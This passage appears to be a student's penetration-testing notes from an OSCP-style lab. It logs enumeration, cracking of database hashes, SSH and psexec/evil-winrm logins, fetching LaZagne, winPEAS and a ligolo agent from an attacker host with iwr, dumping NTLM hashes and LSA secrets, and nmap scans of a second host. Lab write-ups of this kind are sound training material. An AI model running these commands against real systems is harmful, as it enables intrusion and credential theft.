+400      GET       82l      279w     3490c http://192.168.183.153:8000/**http%3A
+400      GET       82l      279w     3490c http://192.168.183.153:8000/**http%3A.aspx
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A%2F%2Fyoutube
+400      GET       82l      279w     3490c http://192.168.183.153:8000/http%3A%2F%2Fyoutube.aspx
+
+feroxbuster -u http://192.168.183.153:8000/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+			http://192.168.183.153:8000/partner
+feroxbuster -u http://192.168.183.153:8000/partner -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+200      GET        7l       38w    16406c http://192.168.183.153:8000/partner/db
+200      GET        7l       38w    16406c http://192.168.183.153:8000/partner/DB
+200      GET        1l        6w       37c http://192.168.183.153:8000/partner/CHANGELOG
+200      GET        7l       38w    16406c http://192.168.183.153:8000/partner/Db
+
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.txt
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.html
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.php
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.asp
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.aspx
+400      GET        6l       26w      324c http://192.168.183.153:8000/partner/error%1F_log.jsp
+
+
+			http://192.168.183.153:8000/aspnet_client
+feroxbuster -u http://192.168.183.153:8000/aspnet_client -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+http://192.168.183.153:8000/aspnet_client/system_web/
+
+
+			http://192.168.183.153:8000/partner/CHANGELOG
+Moved partner portal to correct VHOST
+
+feroxbuster -u http://192.168.183.153:8000 -v    
+fierce -dns http://192.168.183.153:8000/
+curl -i http://192.168.183.153:8000/
+
+
+			http://192.168.183.153:8000/partner/DB
+Open SQLite > Browse Data
+
+md5: 
+ecorp:7007296521223107d3445ea0db5a04f9
+support:26231162520c611ccabfb18b5ae4dff2 support account for internal use
+
+Unknown: 
+bcorp:e7966b31d1cad8a83f12ecec236c384c
+acorp:df5fb539ff32f7fde5f3c05d8c8c1a6e
+
+CRACK HASHES:
+https://crackstation.net/
+26231162520c611ccabfb18b5ae4dff2	md5	Freedom1
+7007296521223107d3445ea0db5a04f9	md5	ecorp
+
+
+				ACCESS: SSH: 22
+┌──(kali㉿kali)-[~]
+└─$ ssh support@192.168.183.153
+Freedom1
+
+support@MS01 C:\Users\support> whoami           
+ms01\support                  
+                              
+support@MS01 C:\Users\support> hostname
+MS01                          
+
+support@MS01 C:\Users\support>dir                         
+ Volume in drive C has no label.                    
+ Volume Serial Number is 3C99-887F
+ Directory of C:\Users\support                                                  
+11/21/2022  05:49 AM    <DIR>          .            
+11/21/2022  05:49 AM    <DIR>          ..           
+11/21/2022  05:49 AM         6,102,702 admintool.exe
+
+support@MS01 C:\Users\support>powershell -ep bypass
+
+PS C:\Users\support> systeminfo
+ERROR: Access denied
+
+				NETWORK: INTERNAL 
+PS C:\Users\support> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : MS01
+   Primary Dns Suffix  . . . . . . . : oscp.exam
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : oscp.exam
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-13-44
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.183.153(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.183.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
+   Physical Address. . . . . . . . . : 00-50-56-AB-D4-FA
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 10.10.143.153(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+   DNS Servers . . . . . . . . . . . : 10.10.143.152
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+PS C:\Users\support> route print
+===========================================================================
+Interface List
+  6...00 50 56 ab 13 44 ......vmxnet3 Ethernet Adapter
+  8...00 50 56 ab d4 fa ......vmxnet3 Ethernet Adapter #2
+  1...........................Software Loopback Interface 1
+===========================================================================
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0  192.168.183.254  192.168.183.153     16
+      10.10.143.0    255.255.255.0         On-link     10.10.143.153    271
+    10.10.143.153  255.255.255.255         On-link     10.10.143.153    271
+    10.10.143.255  255.255.255.255         On-link     10.10.143.153    271
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+    192.168.183.0    255.255.255.0         On-link   192.168.183.153    271
+  192.168.183.153  255.255.255.255         On-link   192.168.183.153    271
+  192.168.183.255  255.255.255.255         On-link   192.168.183.153    271
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link   192.168.183.153    271
+        224.0.0.0        240.0.0.0         On-link     10.10.143.153    271
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link   192.168.183.153    271
+  255.255.255.255  255.255.255.255         On-link     10.10.143.153    271
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0  192.168.183.254       1
+===========================================================================
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    331 ::1/128                  On-link
+  1    331 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+PS C:\Users\support> arp -A
+Interface: 192.168.183.153 --- 0x6
+  Internet Address      Physical Address      Type
+  192.168.183.254       00-50-56-ab-36-31     dynamic
+  192.168.183.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+Interface: 10.10.143.153 --- 0x8
+  Internet Address      Physical Address      Type
+  10.10.143.152         00-50-56-ab-07-b0     dynamic
+  10.10.143.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+
+				CREDS: NOTHING
+#Powershell password hunting:
+PS C:\Users\support> (Get-PSReadlineOption).HistorySavePath
+C:\Users\support\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\support> type C:\Users\support\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+\ConsoleHost_history.txt
+
+# LaZagne: 
+iwr -uri http://192.168.45.175:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+[+] 0 passwords have been found.
+
+				FILES OF INTEREST: NOTHING
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
+Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue -Force
+
+
+				PRIV ESC: 
+
+support@MS01 C:\Users\support> whoami /priv
+PRIVILEGES INFORMATION                                                    
+----------------------
+Privilege Name                Description                          State  
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+support@MS01 C:\Users\support> net users
+User accounts for \\MS01
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+Mary.Williams            support                  WDAGUtilityAccount
+
+support@MS01 C:\Users\support>net users /domain 
+The request will be processed at a domain controller for domain oscp.exam.
+System error 5 has occurred.
+Access is denied.
+
+# WinPEAS:
+iwr -uri http://192.168.45.175:80/winPEASx64.exe -Outfile winpea.exe
+.\winpea.exe
+
+╔══════════╣ AV Information
+  [X] Exception: Access denied 
+    No AV was detected!!
+
+╔══════════╣ Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    support::MS01:1122334455667788:3dcac456ff564b4f3ca20f6335fb6e92:01010000000000003ac55b7
+4f6a4da01e3a9507b63865be6000000000800300030000000000000000000000000200000b3bb0ae146f4cc0753a90a242
+a122ef65c5df444f08faa0e4137548c13222b5e0a001000000000000000000000000000000000000900000000000000000
+00000    
+
+
+				ADMINTOOL.EXE:
+PS C:\Users\support> .\admintool.exe --help
+admintool
+
+USAGE:
+    admintool.exe <CMD>
+
+ARGS:
+    <CMD>
+
+OPTIONS:
+    -h, --help    Print help information
+
+
+				POWERSHELL: 
+PS C:\Users\support> admintool.exe whoami
+admintool.exe : The term 'admintool.exe' is not recognized as the name of a cmdlet, function, 
+script file, or operable program. Check the spelling of the name, or if a path was included,      
+verify that the path is correct and try again.
+At line:1 char:1
++ admintool.exe whoami
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (admintool.exe:String) [], CommandNotFoundExceptio  
+   n
+    + FullyQualifiedErrorId : CommandNotFoundException
+Suggestion [3,General]: The command admintool.exe was not found, but does exist in the current loc
+ation. Windows PowerShell does not load commands from the current location by default. If you trus
+t this command, instead type: ".\admintool.exe". See "get-help about_Command_Precedence" for more 
+details.
+
+				CMD: 
+support@MS01 C:\Users\support>admintool.exe whoami  
+Enter administrator password:
+admin
+thread 'main' panicked at 'assertion failed: `(left == right)`                                
+  left: `"21232f297a57a5a743894a0e4a801fc3"`,                                                 
+ right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
+note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace     
+
+CRACK HASH: 
+https://crackstation.net/
+21232f297a57a5a743894a0e4a801fc3	md5	admin
+05f8ba9f047f799adbea95a16de2ef5d	md5	December31
+
+
+			ACCESS: Administrator
+SSH: 
+┌──(kali㉿kali)-[~]
+└─$ ssh administrator@192.168.183.153
+
+administrator@MS01 C:\Users\Administrator>whoami
+ms01\administrator    
+
+
+SMB: 
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec administrator:December31@192.168.183.153 cmd.exe
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+C:\Windows\system32> whoami
+nt authority\system
+
+
+WINRM: 
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.183.153 -u Administrator -p December31 
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+ms01\administrator
+
+
+			CREDS / HASHES: 
+# Powershell password hunting:
+*Evil-WinRM* PS C:\Users\Administrator\Documents> (Get-PSReadlineOption).HistorySavePath
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
+Cannot find path 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.
+
+# CHECK FOLDER$$$$$$
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine
+
+*Evil-WinRM* PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+
+shutdown /r /t 7
+*Evil-WinRM* PS C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt.1
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+
+
+# LaZagne: 
+iwr -uri http://192.168.45.175:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+
+[+] System masterkey decrypted for 233ec4f0-427e-4365-81f1-eb0113562a7b
+[+] System masterkey decrypted for 9577d491-234f-4cc7-bda6-c7cb787def4f
+[+] System masterkey decrypted for 98e7f77d-8897-4d55-935d-61f8a68c56ec
+[+] System masterkey decrypted for bdba25ce-60c3-4414-bd18-0b98d962eb85
+########## User: SYSTEM ##########
+------------------- Hashdump passwords -----------------
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+------------------- Pypykatz passwords -----------------
+[+] Shahash found !!!
+Shahash: 5855732e9441d421d33dfd2f28916e48479344d5
+Nthash: 3e2943aaeb6e59a53fd3297b3af03388
+Login: MS01$
+[+] Shahash found !!!
+Shahash: 90afa30798b082c0d0aae85435421502c254d459
+Nthash: 3c4495bbd678fac8c9d218be4f2bbc7b
+Login: Administrator
+[+] Shahash found !!!
+Shahash: 5ed7fe7645e56521757cfe723707adc7cf17e4d5
+Nthash: d9358122015c5b159574a88b3c0d2071
+Login: support
+------------------- Lsa_secrets passwords -----------------
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   C4 CF F9 B3 28 D6 BD 57 F0 7D 4D 47 BE 37 0C 26    ....(..W.}MG.7.&
+0020   09 DF 1E E8 98 C8 50 96 83 21 BD 7B A4 44 BE 93    ......P..!.{.D..
+0030   1A 8E 3D 9B C9 CB DE 76 77 E0 64 75 E8 5B 17 C5    ..=....vw.du.[..
+0040   4E 9A E2 38 64 2C 57 2A B0 D4 07 33 DD C3 97 2E    N..8d,W*...3....
+0050   39 57 94 73 78 39 A8 07 F5 CF 10 E7 4D 98 D5 BC    9W.sx9......M...
+0060   74 6F DC 4B 63 4E 51 FC FB 7C E7 E7 5E DA 47 92    to.KcNQ..|..^.G.
+0070   B5 84 D6 55 C2 5D 0E 33 88 9A 93 16 31 C8 FB 5E    ...U.].3....1..^
+0080   38 49 F0 7A 24 8B 0F 67 A6 7C 8E A0 00 65 E6 1D    8I.z$..g.|...e..
+0090   9B 5C 5A C3 B7 3D 77 ED 5D 5F 4D C4 B1 0D 31 F0    ..Z..=w.]_M...1.
+00A0   81 4E DC 99 6F 0B 35 72 87 45 D5 71 89 08 5B CC    .N..o.5r.E.q..[.
+00B0   1A 8E E9 6F 7C B3 69 5D B6 F5 FD 88 03 C2 12 21    ...o|.i].......!
+00C0   5E F2 D5 DC 33 3D 91 7F B5 8C 99 DE 2A EF 3B 2B    ^...3=......*.;+
+00D0   FA B0 C0 4E 66 85 BC AD 26 03 50 63 9A AA 16 02    ...Nf...&.Pc....
+00E0   D4 6C 14 AF C5 99 7B 38 B6 4B 9A 3F F5 76 A7 1E    .l....{8.K.?.v..
+00F0   61 B2 23 C0 BC 92 F3 EB 04 FC 42 9F A4 16 49 7B    a.#.......B...I{
+0100   85 A6 9E 03 45 59 42 4E 92 A3 97 C9 2D 03 63 A9    ....EYBN....-.c.
+DefaultPassword
+0000   1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   37 00 6B 00 38 00 58 00 48 00 6B 00 33 00 64 00    7.k.8.X.H.k.3.d.
+0020   4D 00 74 00 6D 00 70 00 6E 00 43 00 37 00 00 00    M.t.m.p.n.C.7...
+DPAPI_SYSTEM
+0000   01 00 00 00 14 CC 9A CC BB 06 D4 AF 8F 07 29 57    ..............)W
+0010   49 93 3B 06 CF 0D 6D FD 4C 31 EB 80 2E 35 29 D3    I.;...m.L1...5).
+0020   4F 19 8A 04 73 A6 74 5C F5 94 85 27                O...s.t....'
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   F1 9F 8D 0A 3D 6B 2D 13 69 96 2E 4C 32 4D C3 66    ....=k-.i..L2M.f
+0020   D5 36 97 AB 1F 0B F2 38 11 3E DF 05 AE DF 31 70    .6.....8.>....1p
+0030   C0 E3 97 A0 08 31 A9 2A E3 88 48 DD 2C 88 86 56    .....1.*..H.,..V
+0040   83 C9 79 90 03 D5 9D 28 C1 BE 33 D6 0E 7B B7 9B    ..y....(..3..{..
+0050   76 FF 4E 76 F0 C3 6D 1D 2B 88 24 F9 96 B9 0E A1    v.Nv..m.+.$.....
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 13556bce-e3e2-4bbc-9d16-49612c9fff6a
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 351c2c4f-e4c1-4754-9c1a-e23f4a63cdd5
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 38270e6e-a515-4984-aaf7-b8f858a922a6
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 88fc78fb-94d7-4ac8-9781-7f6e67b20483
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey d976c605-e232-4c02-9c33-c5be484210f7
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 13556bce-e3e2-4bbc-9d16-49612c9fff6a
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 351c2c4f-e4c1-4754-9c1a-e23f4a63cdd5
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 38270e6e-a515-4984-aaf7-b8f858a922a6
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey 88fc78fb-94d7-4ac8-9781-7f6e67b20483
+[+] 90afa30798b082c0d0aae85435421502c254d459 ok for masterkey d976c605-e232-4c02-9c33-c5be484210f7
+[+] 5ed7fe7645e56521757cfe723707adc7cf17e4d5 ok for masterkey 77f761a0-151f-44b2-b7c4-a82273f3a7e9
+[+] 3 passwords have been found.
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+
+[+] Shahash found !!!
+Shahash: 90afa30798b082c0d0aae85435421502c254d459
+Nthash: 3c4495bbd678fac8c9d218be4f2bbc7b
+Login: Administrator
+
+[+] Shahash found !!!
+Shahash: 5ed7fe7645e56521757cfe723707adc7cf17e4d5
+Nthash: d9358122015c5b159574a88b3c0d2071
+Login: support
+
+				CRACK HASHES: 
+kali@kali:~/passwordattacks$ hashcat -m 1000 mary.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+kali@kali:~/passwordattacks$ hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+3c4495bbd678fac8c9d218be4f2bbc7b:December31               
+
+kali@kali:~/passwordattacks$ hashcat -m 1000 support.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+d9358122015c5b159574a88b3c0d2071:Freedom1                 
+
+				PORT FORWARD: 
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+python3 -m http.server 80
+iwr -uri http://192.168.45.175:80/agent.exe -Outfile agent.exe
+./agent -connect 192.168.45.175:11601 -ignore-cert
+
+session 
+1
+sudo ip route add 10.10.143.0/24 dev ligolo
+start
+
+
+--------------------------------------------------------------------------------------------------
+			192.168.216.156 - Frankfurt OS
+FTP: 21
+SSH: 22
+SNMP: 161
+HTTP: 80 8080 8083 8443
+MYSQL: 3306
+SMTP: 25 587 465 2525
+POP3: 110 995
+IMAP: 143 993
+DNS: 53
+
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.216.156
+
+FTP: 21
+21/tcp   open  ftp      syn-ack vsftpd 3.0.3
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: TLS randomness does not represent time
+
+SSH: 22
+22/tcp   open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7X+aCirh+7mdB77GLBNm4ozN2brESLwLUy3ZjBbFyc0102NGeWplnrO4YCEtNUE1RxkWdxuSrpAR9l9cUNuNXXlY9u1s4pDftRF/O9n3wT/WDyg3HTkNZ9SLNZIu/dgyEvpQhS170lx8I9uef20E2pHcbY1ipLgO6/Sy7dSOhCBzI49m7GjlHxqgtStcPWDkK+GVGiMxHzJinlFTkD/YqR8B4icRRik6mfEv12PzRsPAARLCtwW2RNDgcGMgbn1xg4C37POBnIOeI/3cCEFxbmimj8lgx/i2D4uSU84couxLxW7d8wPK9cbRbOEic2kolsZ8GadYKZsdNy6gtQQNz
+|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG46CBq5+i5sgj4e9qfXKj1Pv4hvAqTybVfFDT3EcPmdKemcVPz9frnAiGY/aowl9b7/60wEmGdF4bqVRaInT2Q=
+|   256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsC67CVFJ2AV7MtUrI/o+yrJgOIUHVTCzirx0cueYPw
+
+DNS: 53
+53/tcp   open  domain   syn-ack ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
+
+HTTP: 80 8080 8083 8443
+80/tcp   open  http     syn-ack nginx
+|_http-title: oscp.exam &mdash; Coming Soon
+| http-methods: 
+|   Supported Methods: POST OPTIONS HEAD GET TRACE
+|_  Potentially risky methods: TRACE
+8080/tcp open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+| http-methods: 
+|   Supported Methods: POST OPTIONS HEAD GET TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: oscp.exam &mdash; Coming Soon
+8083/tcp open  http     syn-ack nginx
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to https://192.168.216.156:8083/
+8443/tcp open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
+| http-methods: 
+|   Supported Methods: POST OPTIONS HEAD GET TRACE
+|_  Potentially risky methods: TRACE
+
+SMTP: 25 587 465 2525
+25/tcp   open  smtp     syn-ack Exim smtpd 4.90_1
+|_ssl-date: 2024-05-12T04:35:56+00:00; +38s from scanner time.
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.243], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+
+587/tcp  open  smtp     syn-ack Exim smtpd 4.90_1
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.243], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+
+2525/tcp open  smtp     syn-ack Exim smtpd 4.90_1
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.243], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: 2024-05-12T04:37:25+00:00; +2m07s from scanner time.
+
+465/tcp  open  ssl/smtp syn-ack Exim smtpd 4.90_1
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.243], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+|_ssl-date: 2024-05-12T04:37:49+00:00; +2m32s from scanner time.
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
